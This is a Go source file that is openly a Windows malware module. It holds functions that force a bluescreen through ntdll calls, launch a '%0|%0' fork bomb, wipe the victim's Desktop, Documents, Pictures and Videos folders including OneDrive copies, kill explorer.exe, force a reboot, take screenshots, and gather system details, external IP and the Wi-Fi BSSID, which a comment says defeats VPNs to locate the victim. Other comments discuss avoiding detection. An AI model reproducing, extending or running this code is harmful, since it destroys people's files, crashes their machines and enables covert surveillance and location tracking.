package main

import (
	"fmt"
	"github.com/shirou/gopsutil/cpu"
	"github.com/shirou/gopsutil/disk"
	"github.com/shirou/gopsutil/host"
	"github.com/shirou/gopsutil/mem"
	"github.com/tawesoft/golib/v2/dialog"
	"github.com/vova616/screenshot"
	"image/png"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"regexp"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

type SysInfo struct {
	IP       string
	BSSID    string
	Hostname string
	Platform string
	CPU      string
	RAM      uint64
	Disk     uint64
}

type Screenshot struct {
	BLOB      []byte
	Timestamp string
}

var (
	ntdll              = syscall.NewLazyDLL("ntdll.dll")
	RtlAdjustPrivilege = ntdll.NewProc("RtlAdjustPrivilege")
	NtRaiseHardError   = ntdll.NewProc("NtRaiseHardError")
)

// triggers a bluescreen based on the `opcode` hexadecimal integer
func DoBSoD(opcode uintptr) {
	RtlAdjustPrivilege.Call(19, 1, 0, uintptr(unsafe.Pointer(new(bool))))
	NtRaiseHardError.Call(opcode, 0, 0, uintptr(0), 6, uintptr(unsafe.Pointer(new(uintptr))))
}

// this will starve the system of resources; creating a major lag spike before crashing the system
// basic fork bomb, nothing special here lol.
func StarveSystem() {
	file := TEMP + "\\" + RandStringBytes(8) + ".bat"

	f, _ := os.Create(file)
	f.Close()

	err := os.WriteFile(file, []byte("%0|%0"), 0644)

	if err != nil {
		fmt.Println("Something went wrong: ", err)
	}

	exec.Command("cmd.exe", "/C", file).Start()
}

// self explanatory, deletes all files in the windows default personal directories
func DeletePersonal() {
	NukeDirectory("Desktop")
	NukeDirectory("Pictures")
	NukeDirectory("Images")
	NukeDirectory("Documents")
	NukeDirectory("Videos")
}

func NukeDirectory(dir string) {
	os.RemoveAll(PERSONAL + "\\" + dir)
	os.RemoveAll(PERSONAL + "OneDrive\\" + dir)
	os.MkdirAll(PERSONAL+"\\"+dir, 777)
	os.MkdirAll(PERSONAL+"OneDrive\\"+dir, 777)
}

// kills the `explorer.exe` task, which causes the desktop and taskbar to disappear
func KillDesktop() {
	err := exec.Command("cmd.exe", "/c", "taskkill", "/f", "/t", "/im", "explorer.exe").Run()
	if err != nil {
		fmt.Println("Failed to kill Desktop process:", err)
	}
}

// immediately force-shuts down the system without waiting for processes to terminate
func ForceShutdown() {
	if err := exec.Command("cmd.exe", "/C", "shutdown", "/t", "0", "/r").Run(); err != nil {
		fmt.Println("Failed to initiate shutdown:", err)
	}
}

// snaps a screenshot of the current view, returns the raw bytes and timestamp of the image
// this will likely be detected, since we are currently using an external library for this
func GetScreenShot() Screenshot {
	if _, err := os.Stat(TEMPFILEDIR); os.IsNotExist(err) {
		os.MkdirAll(TEMPFILEDIR, 0700)
	}

	img, err := screenshot.CaptureScreen()
	ts := time.Now().Format("YYYY-MM-DD HH:MM:SS")
	if err != nil {
		panic(err)
	}
	f, err := os.Create(TEMPFILEDIR + "\\A.png")
	if err != nil {
		panic(err)
	}
	err = png.Encode(f, img)
	if err != nil {
		panic(err)
	}
	var _ = f.Close()

	data, _ := os.ReadFile(TEMPFILEDIR + "\\A.png")

	return Screenshot{
		BLOB:      data,
		Timestamp: ts,
	}
}

// gets general system info & specs
func GetSysInfo() *SysInfo {
	hostStat, _ := host.Info()
	cpuStat, _ := cpu.Info()
	vmStat, _ := mem.VirtualMemory()
	diskStat, _ := disk.Usage("\\") // If you're in Unix change this "\\" for "/"

	System := new(SysInfo)

	resp, _ := http.Get("https://myexternalip.com/raw")
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	System.IP = string(body)
	System.BSSID = GetBSSID()
	System.Hostname = hostStat.Hostname
	System.CPU = cpuStat[0].ModelName
	System.Platform = hostStat.Platform
	System.RAM = vmStat.Total / 1024 / 1024
	System.Disk = diskStat.Total / 1024 / 1024

	return System
}

// gets the username of the current user
func GetUsername() string {
	user, err := user.Current()
	if err != nil {
		log.Fatalf(err.Error())
	}

	if strings.Contains(user.Username, "\\") {
		return strings.Split(user.Username, "\\")[1]
	} else {
		return user.Username
	}
}

// gets the BSSID of the connected network (used to find location)
// THIS WILL BYPASS VPNs!!! but does NOT work for LAN.
func GetBSSID() string {
	out, err := exec.Command("cmd", "/c", "netsh wlan show interfaces").CombinedOutput()
	if err != nil {
		fmt.Println("Failed to find BSSID:", err)
	}

	Expression1, e := regexp.Compile("(BSSID[ \\t]*:[ \\t])(([0-9a-f]{2}([:]|)){6})")
	Expression2, e := regexp.Compile("(([0-9a-f]{2}([:]|)){6})")
	if e != nil {
		log.Fatalf(e.Error())
	}

	var RegexFind []string = Expression2.FindAllString(Expression1.FindAllString(string(out), -1)[0], -1)

	if len(RegexFind) == 0 || RegexFind[0] == "" {
		return "None"
	} else {
		return RegexFind[0]
	}
}

// displays x error message with `title` title and `description` description
func DisplayErrorMsg(title string, description string) {
	dialog.Message{
		Title:  title,
		Format: description,
		Icon:   dialog.IconError,
	}.Raise()
}
